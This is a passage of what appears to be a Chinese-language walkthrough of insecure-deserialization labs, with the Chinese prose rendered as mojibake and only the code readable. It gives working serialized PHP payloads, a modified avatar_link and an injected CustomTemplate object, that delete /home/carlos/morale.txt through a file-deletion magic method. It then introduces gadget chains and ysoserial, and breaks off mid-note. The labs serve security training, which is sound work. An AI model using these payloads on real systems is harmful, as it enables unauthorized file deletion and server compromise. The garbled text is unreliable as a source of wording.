<p>é™¤äº†ç®€å•åœ°æ£€æŸ¥å±æ€§å€¼å¤–ï¼Œç½‘ç«™åŠŸèƒ½è¿˜å¯èƒ½å¯¹æ¥è‡ªååºåˆ—åŒ–å¯¹è±¡çš„æ•°æ®æ‰§è¡Œå±é™©æ“ä½œã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥åˆ©ç”¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–ä¼ é€’éé¢„æœŸæ•°æ®ï¼Œå¹¶åˆ©ç”¨ç›¸å…³åŠŸèƒ½è¿›è¡Œç ´åã€‚</p>
<p>ä¾‹å¦‚ï¼Œä½œä¸ºç½‘ç«™ â€œåˆ é™¤ç”¨æˆ· â€åŠŸèƒ½çš„ä¸€éƒ¨åˆ†ï¼Œç”¨æˆ·çš„ä¸ªäººèµ„æ–™å›¾ç‰‡æ˜¯é€šè¿‡è®¿é—® <code>$user-&gt;image_location</code> å±æ€§ä¸­çš„æ–‡ä»¶è·¯å¾„æ¥åˆ é™¤çš„ã€‚å¦‚æœè¯¥ <code>$user</code> æ˜¯é€šè¿‡åºåˆ—åŒ–å¯¹è±¡åˆ›å»ºçš„ï¼Œæ”»å‡»è€…å°±å¯ä»¥é€šè¿‡å°† <code>image_location</code> è®¾ç½®ä¸ºä»»æ„æ–‡ä»¶è·¯å¾„çš„ä¿®æ”¹åä¼ å…¥æ¥åˆ©ç”¨è¿™ä¸€æ¼æ´ã€‚åˆ é™¤è‡ªå·±çš„ç”¨æˆ·è´¦æˆ·åï¼Œä¹Ÿä¼šåˆ é™¤è¿™ä¸ªä»»æ„æ–‡ä»¶ã€‚</p>
<h4 id="Labï¼š-ä½¿ç”¨åº”ç”¨ç¨‹åºåŠŸèƒ½åˆ©ç”¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–">Labï¼š ä½¿ç”¨åº”ç”¨ç¨‹åºåŠŸèƒ½åˆ©ç”¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–</h4>
<p>æœ¬å®éªŒå®¤ä½¿ç”¨åŸºäºåºåˆ—åŒ–çš„ä¼šè¯æœºåˆ¶ã€‚æŸä¸ªåŠŸèƒ½ä¼šå¯¹åºåˆ—åŒ–å¯¹è±¡ä¸­æä¾›çš„æ•°æ®è°ƒç”¨ä¸€ä¸ªå±é™©çš„æ–¹æ³•ã€‚è¦è§£å†³è¿™ä¸ªå®éªŒé—®é¢˜ï¼Œè¯·ç¼–è¾‘ä¼šè¯ cookie ä¸­çš„åºåˆ—åŒ–å¯¹è±¡ï¼Œå¹¶ç”¨å®ƒåˆ é™¤<code>Carlos</code>ä¸»ç›®å½•ä¸­çš„ <code>morale.txt</code> æ–‡ä»¶ã€‚</p>
<ol>
<li class="lvl-3">
<p>ç™»å½•è‡ªå·±çš„è´¦æˆ·ã€‚åœ¨ â€œæˆ‘çš„è´¦æˆ· â€é¡µé¢ï¼Œæ³¨æ„åˆ°æœ‰åˆ é™¤è´¦æˆ·çš„é€‰é¡¹ï¼Œå¯å‘ /my-account/delete å‘é€ POST è¯·æ±‚ã€‚</p>
</li>
<li class="lvl-3">
<p>å‘ Burp Repeater å‘é€åŒ…å«ä¼šè¯ cookie çš„è¯·æ±‚ã€‚</p>
</li>
<li class="lvl-3">
<p>åœ¨ Burp Repeater ä¸­ï¼Œä½¿ç”¨æ£€æŸ¥å™¨é¢æ¿ç ”ç©¶ä¼šè¯ cookieã€‚æ³¨æ„åˆ°åºåˆ—åŒ–å¯¹è±¡æœ‰ä¸€ä¸ª avatar_link å±æ€§ï¼Œå…¶ä¸­åŒ…å«å¤´åƒçš„æ–‡ä»¶è·¯å¾„ã€‚</p>
</li>
<li class="lvl-3">
<p>ç¼–è¾‘åºåˆ—åŒ–æ•°æ®ï¼Œä½¿ avatar_link æŒ‡å‘ /home/carlos/morale.txtã€‚è®°ä½è¦æ›´æ–°é•¿åº¦æŒ‡ç¤ºç¬¦ã€‚ä¿®æ”¹åçš„å±æ€§åº”å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
</li>
</ol>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">s</span>:<span class="number">11</span>:<span class="string">&quot;avatar_link&quot;</span>;s:<span class="number">23</span>:<span class="string">&quot;/home/carlos/morale.txt&quot;</span></span><br></pre></td></tr></table></figure>
<ol start="5">
<li class="lvl-3">
<p>ç‚¹å‡» â€œåº”ç”¨æ›´æ”¹â€ã€‚ä¿®æ”¹åçš„å¯¹è±¡å°†è‡ªåŠ¨é‡æ–°ç¼–ç å¹¶æ›´æ–°åˆ°è¯·æ±‚ä¸­ã€‚</p>
</li>
<li class="lvl-3">
<p>å°†è¯·æ±‚è¡Œæ”¹ä¸º POST /my-account/delete å¹¶å‘é€è¯·æ±‚ã€‚æ‚¨çš„è´¦æˆ·å°†è¢«åˆ é™¤ï¼ŒåŒæ—¶åˆ é™¤çš„è¿˜æœ‰å¡æ´›æ–¯çš„ morale.txt æ–‡ä»¶ã€‚</p>
</li>
</ol>
<p>è¿™ä¸ªç¤ºä¾‹ä¾èµ–äºæ”»å‡»è€…é€šè¿‡ç”¨æˆ·å¯è®¿é—®çš„åŠŸèƒ½æ‰‹åŠ¨è°ƒç”¨å±é™©æ–¹æ³•ã€‚ä½†æ˜¯ï¼Œå¦‚æœåˆ©ç”¨æ¼æ´è‡ªåŠ¨å°†æ•°æ®ä¼ é€’åˆ°å±é™©æ–¹æ³•ä¸­ï¼Œä¸å®‰å…¨çš„ååºåˆ—åŒ–å°±ä¼šå˜å¾—æ›´åŠ æœ‰è¶£ã€‚ä½¿ç”¨ â€œmagic methods â€å¯ä»¥å®ç°è¿™ä¸€ç‚¹ã€‚</p>
<h2 id="Magic-methods">Magic methods</h2>
<p>é­”æ³•æ–¹æ³•æ˜¯æ— éœ€æ˜¾å¼è°ƒç”¨çš„æ–¹æ³•çš„ç‰¹æ®Šå­é›†ã€‚ç›¸åï¼Œæ¯å½“å‘ç”Ÿç‰¹å®šäº‹ä»¶æˆ–æƒ…å†µæ—¶ï¼Œå®ƒä»¬å°±ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚é­”æ³•æ–¹æ³•æ˜¯å„ç§è¯­è¨€ä¸­é¢å‘å¯¹è±¡ç¼–ç¨‹çš„å¸¸è§ç‰¹å¾ã€‚æœ‰æ—¶ä¼šåœ¨æ–¹æ³•åç§°çš„å‰ç¼€æˆ–å‘¨å›´åŠ ä¸ŠåŒå¼•å·æ¥è¡¨ç¤ºå®ƒä»¬ã€‚</p>
<p>å¼€å‘äººå‘˜å¯ä»¥åœ¨ç±»ä¸­æ·»åŠ é­”æ³•æ–¹æ³•ï¼Œä»¥ä¾¿é¢„å…ˆç¡®å®šåœ¨ç›¸åº”äº‹ä»¶æˆ–åœºæ™¯å‘ç”Ÿæ—¶åº”æ‰§è¡Œå“ªäº›ä»£ç ã€‚è°ƒç”¨é­”æ³•æ–¹æ³•çš„å…·ä½“æ—¶é—´å’ŒåŸå› å› æ–¹æ³•è€Œå¼‚ã€‚PHP ä¸­æœ€å¸¸è§çš„ä¾‹å­ä¹‹ä¸€æ˜¯ <code>__construct()</code>ï¼Œå®ƒåœ¨ç±»çš„å¯¹è±¡å®ä¾‹åŒ–æ—¶è¢«è°ƒç”¨ï¼Œç±»ä¼¼äº Python çš„ <code>__init__</code> ã€‚é€šå¸¸ï¼Œæ„é€ å‡½æ•°é­”æ³•æ–¹æ³•åŒ…å«åˆå§‹åŒ–å®ä¾‹å±æ€§çš„ä»£ç ã€‚ä¸è¿‡ï¼Œå¼€å‘äººå‘˜å¯ä»¥è‡ªå®šä¹‰é­”æ³•æ–¹æ³•ï¼Œä»¥æ‰§è¡Œä»–ä»¬æƒ³è¦çš„ä»»ä½•ä»£ç ã€‚</p>
<p>é­”æ³•æ–¹æ³•è¢«å¹¿æ³›ä½¿ç”¨ï¼Œå…¶æœ¬èº«å¹¶ä¸ä»£è¡¨æ¼æ´ã€‚ä½†æ˜¯ï¼Œå½“æ‰§è¡Œè¿™äº›æ–¹æ³•çš„ä»£ç å¤„ç†æ”»å‡»è€…å¯æ§åˆ¶çš„æ•°æ®ï¼ˆä¾‹å¦‚æ¥è‡ªååºåˆ—åŒ–å¯¹è±¡çš„æ•°æ®ï¼‰æ—¶ï¼Œå®ƒä»¬å°±ä¼šå˜å¾—å±é™©ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œåœ¨æ»¡è¶³ç›¸åº”æ¡ä»¶æ—¶è‡ªåŠ¨è°ƒç”¨ååºåˆ—åŒ–æ•°æ®ä¸Šçš„æ–¹æ³•ã€‚</p>
<p>æœ€é‡è¦çš„æ˜¯ï¼Œæœ‰äº›è¯­è¨€åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¼šè‡ªåŠ¨è°ƒç”¨é­”æ³•æ–¹æ³•ã€‚ä¾‹å¦‚ï¼ŒPHP çš„ <code>unserialize()</code> æ–¹æ³•ä¼šæŸ¥æ‰¾å¹¶è°ƒç”¨å¯¹è±¡çš„ <code>__wakeup()</code> é­”æ³•æ–¹æ³•ã€‚</p>
<p>åœ¨ Java ååºåˆ—åŒ–ä¸­ï¼Œ<code>ObjectInputStream.readObject()</code> æ–¹æ³•ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œè¯¥æ–¹æ³•ç”¨äºä»åˆå§‹å­—èŠ‚æµä¸­è¯»å–æ•°æ®ï¼Œæœ¬è´¨ä¸Šç±»ä¼¼äº â€œé‡æ–°åˆå§‹åŒ– â€åºåˆ—åŒ–å¯¹è±¡çš„æ„é€ å‡½æ•°ã€‚ä¸è¿‡ï¼Œå¯åºåˆ—åŒ–ç±»ä¹Ÿå¯ä»¥æŒ‰å¦‚ä¸‹æ–¹å¼å£°æ˜è‡ªå·±çš„ <code>readObject()</code> æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// implementation</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä»¥è¿™ç§æ–¹å¼å£°æ˜çš„ <code>readObject()</code> æ–¹æ³•å°±åƒä¸€ä¸ªé­”æ³•æ–¹æ³•ï¼Œåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¼šè¢«è°ƒç”¨ã€‚è¿™æ ·ï¼Œç±»å°±èƒ½æ›´ç´§å¯†åœ°æ§åˆ¶è‡ªå·±å­—æ®µçš„ååºåˆ—åŒ–ã€‚</p>
<p>ä½ åº”è¯¥å¯†åˆ‡å…³æ³¨ä»»ä½•åŒ…å«è¿™ç±»ç¥å¥‡æ–¹æ³•çš„ç±»ã€‚å®ƒä»¬å…è®¸ä½ åœ¨å¯¹è±¡å®Œå…¨ååºåˆ—åŒ–ä¹‹å‰å°†æ•°æ®ä»åºåˆ—åŒ–å¯¹è±¡ä¼ é€’åˆ°ç½‘ç«™ä»£ç ä¸­ã€‚è¿™æ˜¯åˆ›å»ºæ›´é«˜çº§æ¼æ´çš„èµ·ç‚¹ã€‚</p>
<h2 id="æ³¨å…¥ä»»æ„å¯¹è±¡">æ³¨å…¥ä»»æ„å¯¹è±¡</h2>
<p>æ­£å¦‚æˆ‘ä»¬æ‰€è§ï¼Œå¶å°”å¯ä»¥é€šè¿‡ç®€å•ç¼–è¾‘ç½‘ç«™æä¾›çš„å¯¹è±¡æ¥åˆ©ç”¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–ã€‚ç„¶è€Œï¼Œæ³¨å…¥ä»»æ„å¯¹è±¡ç±»å‹ä¼šå¸¦æ¥æ›´å¤šå¯èƒ½æ€§ã€‚</p>
<p>åœ¨é¢å‘å¯¹è±¡ç¼–ç¨‹ä¸­ï¼Œå¯¹è±¡å¯ç”¨çš„æ–¹æ³•ç”±å…¶ç±»å†³å®šã€‚å› æ­¤ï¼Œå¦‚æœæ”»å‡»è€…èƒ½æ“çºµä½œä¸ºåºåˆ—åŒ–æ•°æ®ä¼ å…¥çš„å¯¹è±¡ç±»åˆ«ï¼Œå°±èƒ½å½±å“ååºåˆ—åŒ–åç”šè‡³ååºåˆ—åŒ–è¿‡ç¨‹ä¸­æ‰§è¡Œçš„ä»£ç ã€‚</p>
<p>ååºåˆ—åŒ–æ–¹æ³•é€šå¸¸ä¸ä¼šæ£€æŸ¥å®ƒä»¬æ­£åœ¨ååºåˆ—åŒ–çš„å¯¹è±¡ã€‚è¿™æ„å‘³ç€ä½ å¯ä»¥ä¼ å…¥ç½‘ç«™å¯ç”¨çš„ä»»ä½•å¯åºåˆ—åŒ–ç±»çš„å¯¹è±¡ï¼Œè€Œè¯¥å¯¹è±¡å°†è¢«ååºåˆ—åŒ–ã€‚è¿™å®é™…ä¸Šå…è®¸æ”»å‡»è€…åˆ›å»ºä»»æ„ç±»çš„å®ä¾‹ã€‚è¿™ä¸ªå¯¹è±¡ä¸æ˜¯é¢„æœŸçš„ç±»å¹¶ä¸é‡è¦ã€‚æ„å¤–çš„å¯¹è±¡ç±»å‹å¯èƒ½ä¼šå¯¼è‡´åº”ç”¨ç¨‹åºé€»è¾‘å‡ºç°å¼‚å¸¸ï¼Œä½†æ¶æ„å¯¹è±¡å±Šæ—¶å·²ç»å®ä¾‹åŒ–äº†ã€‚</p>
<p>å¦‚æœæ”»å‡»è€…å¯ä»¥è®¿é—®æºä»£ç ï¼Œä»–ä»¬å°±å¯ä»¥è¯¦ç»†ç ”ç©¶æ‰€æœ‰å¯ç”¨çš„ç±»ã€‚è¦æ„å»ºä¸€ä¸ªç®€å•çš„æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥æŸ¥æ‰¾åŒ…å«ååºåˆ—åŒ–é­”æ³•æ–¹æ³•çš„ç±»ï¼Œç„¶åæ£€æŸ¥å…¶ä¸­æ˜¯å¦æœ‰å¯¹å¯æ§æ•°æ®æ‰§è¡Œå±é™©æ“ä½œçš„ç±»ã€‚ç„¶åï¼Œæ”»å‡»è€…å°±å¯ä»¥ä¼ å…¥è¯¥ç±»çš„åºåˆ—åŒ–å¯¹è±¡ï¼Œä½¿ç”¨å…¶é­”æ³•æ–¹æ³•è¿›è¡Œæ”»å‡»ã€‚</p>
<h4 id="Labï¼š-PHP-ä¸­çš„ä»»æ„å¯¹è±¡æ³¨å…¥">Labï¼š PHP ä¸­çš„ä»»æ„å¯¹è±¡æ³¨å…¥</h4>
<p>æœ¬å®éªŒä½¿ç”¨åŸºäºåºåˆ—åŒ–çš„ä¼šè¯æœºåˆ¶ï¼Œå› æ­¤å®¹æ˜“å—åˆ°ä»»æ„å¯¹è±¡æ³¨å…¥çš„æ”»å‡»ã€‚è¦è§£å†³è¯¥å®éªŒé—®é¢˜ï¼Œè¯·åˆ›å»ºå¹¶æ³¨å…¥ä¸€ä¸ªæ¶æ„åºåˆ—åŒ–å¯¹è±¡ï¼Œä»¥åˆ é™¤ Carlos home ç›®å½•ä¸­çš„ morale.txt æ–‡ä»¶ã€‚æ‚¨éœ€è¦è·å¾—æºä»£ç è®¿é—®æƒé™æ‰èƒ½è§£å†³æœ¬å®éªŒã€‚</p>
<ol>
<li class="lvl-3">
<p>ç™»å½•è‡ªå·±çš„è´¦æˆ·ï¼Œæ³¨æ„ä¼šè¯ cookie åŒ…å«ä¸€ä¸ªåºåˆ—åŒ–çš„ PHP å¯¹è±¡ã€‚</p>
</li>
<li class="lvl-3">
<p>åœ¨ç½‘ç«™åœ°å›¾ä¸­ï¼Œæ³¨æ„åˆ°ç½‘ç«™å¼•ç”¨äº† <code>/libs/CustomTemplate.php</code> æ–‡ä»¶ã€‚å³é”®å•å‡»è¯¥æ–‡ä»¶ï¼Œé€‰æ‹© â€œå‘é€åˆ°ä¸­ç»§å™¨â€ã€‚</p>
</li>
</ol>
<p><img src="/posts/bea7d250//image-20250527163121200.png" alt="image-20250527163121200"></p>
<ol start="3">
<li class="lvl-3">
<p>åœ¨ Burp Repeater ä¸­ï¼Œæ³¨æ„åœ¨è¯·æ±‚è¡Œçš„æ–‡ä»¶ååæ·»åŠ ä¸€ä¸ªæ–œæ  (<code>~</code>) å°±èƒ½è¯»å–æºä»£ç ã€‚</p>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CustomTemplate</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$template_file_path</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$lock_file_path</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$template_file_path</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;template_file_path = <span class="variable">$template_file_path</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lock_file_path = <span class="variable">$template_file_path</span> . <span class="string">&quot;.lock&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">isTemplateLocked</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;lock_file_path);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getTemplate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;template_file_path);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">saveTemplate</span>(<span class="params"><span class="variable">$template</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">isTemplateLocked</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;lock_file_path, <span class="string">&quot;&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Could not write to &quot;</span> . <span class="variable language_">$this</span>-&gt;lock_file_path);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;template_file_path, <span class="variable">$template</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Could not write to &quot;</span> . <span class="variable language_">$this</span>-&gt;template_file_path);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// Carlos thought this would be a good idea</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;lock_file_path)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;lock_file_path);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ol start="4">
<li class="lvl-3">
<p>åœ¨æºä»£ç ä¸­ï¼Œè¯·æ³¨æ„ <code>CustomTemplate</code> ç±»åŒ…å« <code>__destruct()</code> é­”æ³•æ–¹æ³•ã€‚è¿™å°†è°ƒç”¨ <code>lock_file_path</code> å±æ€§ä¸Šçš„ <code>unlink()</code> æ–¹æ³•ï¼Œä»è€Œåˆ é™¤è¯¥è·¯å¾„ä¸Šçš„æ–‡ä»¶ã€‚</p>
</li>
<li class="lvl-3">
<p>åœ¨ Burp è§£ç å™¨ä¸­ï¼Œä½¿ç”¨åºåˆ—åŒ– PHP æ•°æ®çš„æ­£ç¡®è¯­æ³•åˆ›å»ºä¸€ä¸ª <code>CustomTemplate</code> å¯¹è±¡ï¼Œå¹¶å°† <code>lock_file_path</code> å±æ€§è®¾ç½®ä¸º <code>/home/carlos/morale.txt</code>ã€‚ç¡®ä¿ä½¿ç”¨æ­£ç¡®çš„æ•°æ®ç±»å‹æ ‡ç­¾å’Œé•¿åº¦æŒ‡ç¤ºç¬¦ã€‚æœ€ç»ˆå¯¹è±¡åº”å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
</li>
</ol>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">14</span>:<span class="string">&quot;CustomTemplate&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;lock_file_path&quot;</span>;s:<span class="number">23</span>:<span class="string">&quot;/home/carlos/morale.txt&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<ol start="6">
<li class="lvl-3">
<p>å¯¹è¯¥å¯¹è±¡è¿›è¡Œ Base64 å’Œ URL ç¼–ç ï¼Œå¹¶å°†å…¶ä¿å­˜åˆ°å‰ªè´´æ¿ã€‚</p>
</li>
<li class="lvl-3">
<p>å‘ Burp Repeater å‘é€åŒ…å«ä¼šè¯ cookie çš„è¯·æ±‚ã€‚</p>
</li>
<li class="lvl-3">
<p>åœ¨ Burp Repeater ä¸­ï¼Œç”¨å‰ªè´´æ¿ä¸­ä¿®æ”¹åçš„ cookie æ›¿æ¢ä¼šè¯ cookieã€‚</p>
</li>
<li class="lvl-3">
<p>å‘é€è¯·æ±‚ã€‚é­”æ³•æ–¹æ³• <code>__destruct()</code> ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ï¼Œå¹¶åˆ é™¤ Carlos çš„æ–‡ä»¶ã€‚</p>
</li>
</ol>
<p>åŒ…å«è¿™äº›ååºåˆ—åŒ–é­”æ³•æ–¹æ³•çš„ç±»è¿˜å¯ç”¨äºå‘èµ·æ›´å¤æ‚çš„æ”»å‡»ï¼Œå…¶ä¸­æ¶‰åŠä¸€é•¿ä¸²æ–¹æ³•è°ƒç”¨ï¼Œå³æ‰€è°“çš„ â€œå°å·¥å…·é“¾â€ã€‚</p>
<h2 id="å°å·¥å…·é“¾">å°å·¥å…·é“¾</h2>
<p>å°å·¥å…· &quot;æ˜¯åº”ç”¨ç¨‹åºä¸­å­˜åœ¨çš„ä»£ç ç‰‡æ®µï¼Œå¯å¸®åŠ©æ”»å‡»è€…å®ç°ç‰¹å®šç›®æ ‡ã€‚å•ä¸ªå°å·¥å…·å¯èƒ½ä¸ä¼šç›´æ¥å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä»»ä½•æœ‰å®³æ“ä½œã€‚ä½†æ˜¯ï¼Œæ”»å‡»è€…çš„ç›®æ ‡å¯èƒ½åªæ˜¯è°ƒç”¨ä¸€ä¸ªæ–¹æ³•ï¼Œå°†ç”¨æˆ·è¾“å…¥ä¼ é€’åˆ°å¦ä¸€ä¸ªå°å·¥å…·ä¸­ã€‚é€šè¿‡ä»¥è¿™ç§æ–¹å¼å°†å¤šä¸ªå°å·¥å…·ä¸²è”åœ¨ä¸€èµ·ï¼Œæ”»å‡»è€…å°±æœ‰å¯èƒ½å°†å…¶è¾“å…¥ä¼ é€’åˆ°ä¸€ä¸ªå±é™©çš„ â€œä¸‹æ²‰å°å·¥å…· â€ä¸­ï¼Œä»è€Œé€ æˆæœ€å¤§çš„ç ´åã€‚</p>
<p>é‡è¦çš„æ˜¯è¦æ˜ç™½ï¼Œä¸å…¶ä»–ä¸€äº›ç±»å‹çš„æ¼æ´åˆ©ç”¨ä¸åŒï¼Œå°å·¥å…·é“¾ä¸æ˜¯æ”»å‡»è€…æ„å»ºçš„é“¾å¼æ–¹æ³•çš„æœ‰æ•ˆpayloadã€‚æ‰€æœ‰ä»£ç éƒ½å·²å­˜åœ¨äºç½‘ç«™ä¸Šã€‚æ”»å‡»è€…å”¯ä¸€èƒ½æ§åˆ¶çš„æ˜¯ä¼ å…¥å°å·¥å…·é“¾çš„æ•°æ®ã€‚è¿™é€šå¸¸æ˜¯é€šè¿‡åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­è°ƒç”¨çš„é­”æ³•æ–¹æ³•æ¥å®ç°çš„ï¼Œæœ‰æ—¶ä¹Ÿç§°ä¸º â€œå¯åŠ¨å°å·¥å…·â€ã€‚</p>
<p>åœ¨å¤–ç½‘ï¼Œè®¸å¤šä¸å®‰å…¨çš„ååºåˆ—åŒ–æ¼æ´åªèƒ½é€šè¿‡ä½¿ç”¨å°å·¥å…·é“¾æ¥åˆ©ç”¨ã€‚è¿™æœ‰æ—¶å¯èƒ½æ˜¯ç®€å•çš„ä¸€æ­¥æˆ–ä¸¤æ­¥é“¾ï¼Œä½†æ„å»ºé«˜ä¸¥é‡æ€§æ”»å‡»å¯èƒ½éœ€è¦æ›´å¤æ‚çš„å¯¹è±¡å®ä¾‹åŒ–å’Œæ–¹æ³•è°ƒç”¨åºåˆ—ã€‚å› æ­¤ï¼Œèƒ½å¤Ÿæ„å»ºå°å·¥å…·é“¾æ˜¯æˆåŠŸåˆ©ç”¨ä¸å®‰å…¨ååºåˆ—åŒ–çš„å…³é”®å› ç´ ä¹‹ä¸€ã€‚</p>
<h3 id="ä½¿ç”¨é¢„åˆ¶å°å·¥å…·é“¾">ä½¿ç”¨é¢„åˆ¶å°å·¥å…·é“¾</h3>
<p>æ‰‹åŠ¨è¯†åˆ«å°å·¥å…·é“¾å¯èƒ½æ˜¯ä¸€ä¸ªç›¸å½“è‰°å·¨çš„è¿‡ç¨‹ï¼Œè€Œä¸”åœ¨æ²¡æœ‰æºä»£ç è®¿é—®æƒé™çš„æƒ…å†µä¸‹å‡ ä¹æ˜¯ä¸å¯èƒ½çš„ã€‚å¹¸è¿çš„æ˜¯ï¼Œæœ‰å‡ ç§ä½¿ç”¨é¢„å»ºå°å·¥å…·é“¾çš„æ–¹æ³•å¯ä»¥å…ˆè¯•è¯•ã€‚</p>
<p>æœ‰å‡ ç§å·¥å…·å¯ä»¥æä¾›ä¸€ç³»åˆ—é¢„å…ˆå‘ç°çš„é“¾ï¼Œè¿™äº›é“¾å·²åœ¨å…¶ä»–ç½‘ç«™ä¸Šè¢«æˆåŠŸåˆ©ç”¨ã€‚å³ä½¿æ‚¨æ²¡æœ‰è®¿é—®æºä»£ç çš„æƒé™ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨è¿™äº›å·¥å…·æ¥è¯†åˆ«å’Œåˆ©ç”¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–æ¼æ´ï¼Œæ‰€éœ€çš„å·¥ä½œé‡ç›¸å¯¹è¾ƒå°ã€‚ä¹‹æ‰€ä»¥èƒ½é‡‡ç”¨è¿™ç§æ–¹æ³•ï¼Œæ˜¯å› ä¸ºå¹¿æ³›ä½¿ç”¨äº†åŒ…å«å¯åˆ©ç”¨å°å·¥å…·é“¾çš„åº“ã€‚ä¾‹å¦‚ï¼Œå¦‚æœ Java çš„ Apache Commons Collections åº“ä¸­çš„å°å·¥å…·é“¾å¯ä»¥åœ¨ä¸€ä¸ªç½‘ç«™ä¸Šè¢«åˆ©ç”¨ï¼Œé‚£ä¹ˆä»»ä½•å…¶ä»–å®ç°è¯¥åº“çš„ç½‘ç«™ä¹Ÿå¯ä»¥ä½¿ç”¨ç›¸åŒçš„å°å·¥å…·é“¾è¿›è¡Œåˆ©ç”¨ã€‚</p>
<h4 id="ysoserial">ysoserial</h4>
<p>ysoserial &quot;å°±æ˜¯è¿™æ ·ä¸€ä¸ª Java ååºåˆ—åŒ–å·¥å…·ã€‚å®ƒå¯ä»¥è®©ä½ ä»æä¾›çš„å°å·¥å…·é“¾ä¸­é€‰æ‹©ä¸€ä¸ªä½ è®¤ä¸ºç›®æ ‡åº”ç”¨ç¨‹åºæ­£åœ¨ä½¿ç”¨çš„åº“ï¼Œç„¶åä¼ å…¥ä½ æƒ³æ‰§è¡Œçš„å‘½ä»¤ã€‚ç„¶åï¼Œå®ƒä¼šæ ¹æ®æ‰€é€‰é“¾åˆ›å»ºä¸€ä¸ªåˆé€‚çš„åºåˆ—åŒ–å¯¹è±¡ã€‚è¿™ä»ç„¶éœ€è¦ä¸€å®šçš„å°è¯•å’Œé”™è¯¯ï¼Œä½†æ¯”æ‰‹åŠ¨æ„å»ºè‡ªå·±çš„å°å·¥å…·é“¾è¦çœåŠ›å¾—å¤šã€‚</p>
<blockquote>
<p><strong>Note</strong><br>
åœ¨ Java 16 åŠä»¥ä¸Šç‰ˆæœ¬ä¸­ï¼Œæ‚¨éœ€è¦è®¾ç½®ä¸€ç³»åˆ—å‘½ä»¤è¡Œå‚æ•°ï¼Œä»¥ä¾¿ Java è¿è¡Œ ysoserialã€‚ä¾‹å¦‚</p>
